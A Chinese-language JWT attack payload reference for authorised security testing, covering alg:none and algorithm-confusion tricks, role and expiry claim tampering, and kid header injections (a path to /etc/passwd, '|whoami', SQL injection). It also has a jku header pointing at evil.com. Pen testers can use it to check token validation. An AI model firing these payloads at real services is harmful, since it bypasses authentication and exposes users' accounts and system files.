# JWT 攻击载荷库

> 用于 A3 权限测试的 JWT 专项扩展。

---

## JWT 基础结构

```
Header.Payload.Signature
base64url(header).base64url(payload).base64url(signature)
```

典型 header: `{"alg":"HS256","typ":"JWT"}`
典型 payload: `{"sub":"123","name":"John","iat":1516239022,"exp":1516242622}`

---

## 篡改攻击

### 算法混淆（HS256 ↔ RS256）

**原理**：强制服务端用公钥（HS256 模式下公钥=密钥）验证。

```
原始 alg: RS256 (非对称)
修改 alg: HS256 (对称)
签名：用公开的公钥重新签名
→ 如果服务端不检查 alg 白名单，验证通过
```

### 算法降级为 None

```
Header: {"alg":"none","typ":"JWT"}
签名：删除签名部分（保留末尾的 .）
Payload: 任意修改
→ "alg":"none" 表示无签名，本不应被接受
```

### 空签名 / 空密钥

```
- alg 保持 HS256，签名改为空字符串 ""
- alg 保持 HS256，密钥改为空字符串重新签名
```

### 混合算法攻击

```
Header 声明 RS256，但实际用 HS256 签名
→ 利用实现读取 header alg 和验证 alg 不一致
```

---

## 声明篡改

### 权限提升

```json
// 原始 payload
{"sub":"123","role":"user"}

// 篡改后
{"sub":"123","role":"admin"}
{"sub":"123","role":["user","admin"]}
{"sub":"123","role":"admin","admin":true}
```

### 过期时间规避

```json
// 延长过期时间
{"exp": 9999999999}

// 移除过期声明
// 删除 "exp" 字段

// 设为未来极远时间
{"exp": 4102444800}  // 2100-01-01
```

### ID 遍历

```json
// 修改用户标识
{"sub":"1"}  → {"sub":"2"}
{"sub":"1"}  → {"sub":"admin"}

// 批量探测
for uid in range(1, 1000): jwt.payload.sub = str(uid)
```

### 注入新声明

```json
// 添加/覆盖关键声明
{"sub":"123","iss":"evil.com"}       // 篡改签发者
{"sub":"123","aud":"admin-api"}      // 篡改受众
{"sub":"123","scope":"admin:all"}    // 添加权限范围
```

---

## 密钥相关攻击

### 弱密钥暴力破解

```
HMAC 密钥常见弱值：
- "secret", "password", "key"
- 项目名、公司名、默认值
- 硬编码在公开代码中的值
- 长度不足的密钥（< 256 bit）
```

### Kid (Key ID) 注入

```
Header: {"alg":"HS256","kid":"../../../etc/passwd"}
Header: {"alg":"HS256","kid":"|whoami"}
Header: {"alg":"HS256","kid":"sql_injection' OR '1'='1"}
```

### Jku (JWK Set URL) 篡改

```
Header: {"alg":"RS256","jku":"https://evil.com/jwks.json"}
→ 指向攻击者控制的 JWK Set
```

---

## 实现层面的 JWT 库漏洞

### 验证跳过

```
- 发送没有签名的 JWT（建议测试）
- 发送签名不匹配的 JWT（建议测试）
- 发送损坏的 base64url
```

### 类型混淆

```
- "sub" 声明改为数组而非字符串
- "exp" 声明改为字符串而非数字
- 添加空声明："": "value"
```

### 深度利用

```
- 创建 JWT 的 JWK Set 时注入恶意密钥
- 自签发（创建自签名的 JWT 作为"可信"声明）
```

---

## 测试步骤

1. 获取一个合法的 JWT（通过正常登录）
2. 解码 JWT（使用 jwt.io 或 `jwt.decode`）
3. 逐个尝试上述攻击
4. 每种攻击记录服务端响应（200/401/403/500）

---

## ⚠️ 重要提醒

- 仅对授权测试的系统使用
- JWT 篡改可以绕过认证——发现后立即报告，不要继续深度利用
